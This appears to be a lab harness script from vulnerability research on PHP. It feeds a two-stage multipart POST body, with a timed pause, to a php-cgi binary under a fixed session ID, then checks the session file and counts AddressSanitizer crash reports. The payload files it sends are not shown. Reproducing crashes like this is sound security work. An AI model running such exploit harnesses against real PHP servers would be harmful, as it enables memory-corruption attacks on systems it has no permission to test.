#!/bin/bash
# run poc1(619) staged shape against a php-cgi (plain or asan).
set -u
BASE=/tmp/opencode/realapps/side
CGI="$1"
SID="$2"
OUTP="$BASE/p619_${SID}_CGI"

rm -f "$BASE/sess/sess_$SID"

feeds() {
python3 - "$BASE/tmp/p619.phase1" "$BASE/tmp/p619.tail" <<'PY'
import sys, time
p = open(sys.argv[1], "rb").read()
t = open(sys.argv[2], "rb").read()
w = sys.stdout.buffer
w.write(p); w.flush()
time.sleep(1.35)
w.write(t); w.flush()
PY
}

TOTAL=$(( $(stat -c%s "$BASE/tmp/p619.phase1") + $(stat -c%s "$BASE/tmp/p619.tail") ))

rm -f "$BASE/tmp/p619.fifo"
mkfifo "$BASE/tmp/p619.fifo"
feeds > "$BASE/tmp/p619.fifo" &
FEEDER=$!

env REDIRECT_STATUS=200 REQUEST_METHOD=POST \
    CONTENT_TYPE='multipart/form-data; boundary=B7kQpoc619' \
    CONTENT_LENGTH=$TOTAL SCRIPT_FILENAME="$BASE/empty.php" QUERY_STRING='' \
    HTTP_COOKIE="PHPSESSID=$SID" GATEWAY_INTERFACE=CGI/1.1 SERVER_PROTOCOL=HTTP/1.1 \
    SERVER_NAME=lab "$CGI" -d cgi.force_redirect=0 -d "session.save_path=$BASE/sess" \
    < "$BASE/tmp/p619.fifo" > "$OUTP.out" 2> "$OUTP.err"
RC=$?
wait $FEEDER 2>/dev/null

SZ=$(stat -c%s "$BASE/sess/sess_$SID" 2>/dev/null || echo NO)
ERRB=$(stat -c%s "$OUTP.err" 2>/dev/null)
AH=$(grep -c AddressSanitizer "$OUTP.err" 2>/dev/null || true)
echo "cgi=$CGI sid=$SID exit=$RC sess=$SZ errB=$ERRB asan_hit=$AH"
